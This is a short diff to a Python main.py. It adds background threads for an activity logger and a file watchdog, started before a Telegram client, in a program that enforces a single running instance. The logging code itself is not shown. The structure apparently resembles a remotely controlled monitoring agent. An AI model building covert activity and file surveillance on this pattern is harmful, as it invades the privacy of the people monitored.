@@ -1,7 +1,7 @@
 # main.py
 
 from single_instance import ensure_single_instance
-
+from file_monitor import start_file_watchdog
 # 🔒 Ensure only one instance runs
 mutex = ensure_single_instance()
 
@@ -15,7 +15,8 @@ import platform
 import sys
 import os
 import time
-
+import threading
+from activity_logger import start_logging # Import the new logger
 logger = setup_logger()
 
 
@@ -53,6 +54,11 @@ def main():
     if not wait_for_internet(timeout=90):
         logger.error("Startup aborted: No internet")
         return
+        # 🚀 Start Activity Logger in the background
+    logger.info("Starting background activity logger...")
+    threading.Thread(target=start_logging, daemon=True).start()
+    # 🚀 Start File Watchdog
+    threading.Thread(target=start_file_watchdog, daemon=True).start()
 
     client = TelegramClient()
 
